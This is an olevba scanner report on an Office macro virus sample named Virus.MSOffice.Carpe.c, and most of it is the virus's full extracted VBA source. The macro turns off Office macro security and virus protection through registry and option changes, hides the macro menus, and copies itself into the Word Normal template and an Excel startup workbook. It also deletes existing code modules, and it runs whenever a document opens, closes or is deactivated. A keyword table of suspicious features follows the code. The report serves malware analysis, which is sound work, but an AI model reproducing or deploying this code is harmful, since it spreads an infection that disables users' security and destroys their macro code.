olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Carpe.c
Type: PPT
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: None - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'kr1tz do this.....!
Private Sub InfectDoc()
On Error Resume Next
Dim InstMast, SaveVict As Boolean
InstMast = False
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level1") <> "" Then
    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level1") = ""
Else
    CommandBars("Tools").Controls("Macro").Enabled = False
    With Options
        .VirusProtection = False
        .SaveNormalPrompt = False
        .ConfirmConversions = False
    End With
End If
If MacroContainer = NormalTemplate Then
    Set Mast = NormalTemplate.VBProject.VBComponents.Item(1)
    Set Vict = ActiveDocument
    CodeMast = Mast.CodeModule.Lines(1, Mast.CodeModule.CountOfLines)
ElseIf MacroContainer = ActiveDocument Then
    Set Mast = ActiveDocument.VBProject.VBComponents.Item(1)
    Set Vict = NormalTemplate
    CodeMast = Mast.CodeModule.Lines(1, Mast.CodeModule.CountOfLines)
End If
DisVirProt
Set xl = CreateObject("Excel.Application")
If UCase(Dir(xl.Application.StartupPath + "\Book1.")) <> UCase("BOOK1") Then
    Set Mastxl = xl.Workbooks.Add
    Mastxl.VBProject.VBComponents("ThisWorkbook").CodeModule.AddFromString CodeMast
    Mastxl.SaveAs FileName:=xl.Application.StartupPath + "\Book1."
End If
xl.Quit
SaveVict = False
If UCase(Mid(Vict.FullName, 1, 3)) <> UCase("DOC") Then SaveVict = True
For Each fVict In Vict.VBProject.VBComponents
    If (fVict.Type <> 100) Then
        Application.OrganizerDelete Vict.FullName, fVict.Name, wdOrganizerObjectProjectItems
    ElseIf (fVict.Type = 100) And (fVict.CodeModule.Find("kr1tz", 1, 1, 10000, 10000) = False) Then
        fVict.CodeModule.DeleteLines 1, fVict.CodeModule.CountOfLines
        InstMast = True
    End If
Next fVict
Set Vict = Vict.VBProject.VBComponents.Item(1)
If InstMast = True Then
    Vict.CodeModule.AddFromString CodeMast
    If NormalTemplate.Saved = True Then NormalTemplate.Save
    If SaveVict = True Then ActiveDocument.Save
End If
End Sub
Private Sub Workbook_Deactivate()
On Error Resume Next
Set Vict = ActiveWorkbook.VBProject.VBComponents.Item(1).CodeModule
Set Code = ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule
CodeMast = Code.Lines(1, Code.CountOfLines)
CommandBars("Tools").Controls("Macro").Enabled = False
If UCase(Dir(Application.StartupPath & "\Book1.")) <> "BOOK1" Then
Set xlApp = CreateObject("Excel.Application")
Set BookMast = xlApp.Workbooks.Add
BookMast.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, CodeMast.Lines(1, CodeMast.CountOfLines)
BookMast.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
xlApp.Quit
End If
Set wd = CreateObject("Word.Application")
wd.Options.SaveNormalPrompt = False
For i = 1 To wd.NormalTemplate.VBProject.VBComponents.Count
Set wdNT = wd.NormalTemplate.VBProject.VBComponents(i)
If wdNT.Type <> 100 Then
wd.Application.OrganizerDelete wd.NormalTemplate.FullName, wd.NormalTemplate.VBProject.VBComponents(i).Name, wd.wdOrganizerObjectProjectItems
ElseIf (wdNT.Type = 100) And (wdNT.CodeModule.Find("kr1tz", 1, 1, 10000, 10000) = False) Then
If wdNT.CodeModule.CountOfLines <> 0 Then
wdNT.CodeModule.DeleteLines 1, wdNT.CodeModule.CountOfLines
End If
wd.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString CodeMast
End If
Next i
Set wd = Nothing
wd.Quit
For i = 1 To ActiveWorkbook.VBProject.VBComponents.Count
If ActiveWorkbook.VBProject.VBComponents(i).CodeModule.Find("'Code", 1, 1, 1000, 1000) = False Then
ActiveWorkbook.VBProject.VBComponents(i).CodeModule.DeleteLines 1, ActiveWorkbook.VBProject.VBComponents(i).CodeModule.CountOfLines
Addi = ActiveWorkbook.VBProject.VBComponents(i).Name
If ActiveWorkbook.VBProject.VBComponents(i).Type = 100 Then
If UCase(Mid((ActiveWorkbook.VBProject.VBComponents(i).Name), 1, 5)) <> "SHEET" Then
ActiveWorkbook.VBProject.VBComponents(i).CodeModule.AddFromString CodeMast
End If
End If
End If
If Mid((ActiveWorkbook.Name), 1, 4) <> "Book" Then
If ActiveWorkbook.Saved = False Then ActiveWorkbook.Save
End If
Next i
End Sub
Private Sub DisVirProt()
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ""
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = ""
System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ""
End Sub
Private Sub Document_Open()
InfectDoc
End Sub
Private Sub Document_Close()
InfectDoc
End Sub







-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: None - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: None - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: None - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

